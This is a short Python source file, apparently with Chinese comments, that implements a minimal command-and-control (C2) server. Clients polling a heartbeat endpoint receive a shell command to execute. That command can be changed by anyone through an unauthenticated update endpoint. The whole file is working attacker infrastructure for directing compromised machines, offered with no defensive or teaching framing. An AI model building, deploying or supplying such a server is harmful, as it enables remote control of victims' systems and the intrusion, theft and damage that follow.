from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class C2ServerHandler(BaseHTTPRequestHandler):
    command_to_execute = "echo Hello, World!"  # 默认命令

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)

        # 处理接收客户端的心跳请求
        if parsed_path.path == '/heartbeat':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(f'COMMAND:{C2ServerHandler.command_to_execute}'.encode())
        # 处理更新命令请求
        elif parsed_path.path == '/update_command' and 'cmd' in query:
            C2ServerHandler.command_to_execute = query['cmd'][0]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Command updated')
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=C2ServerHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting C2 server on port {port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
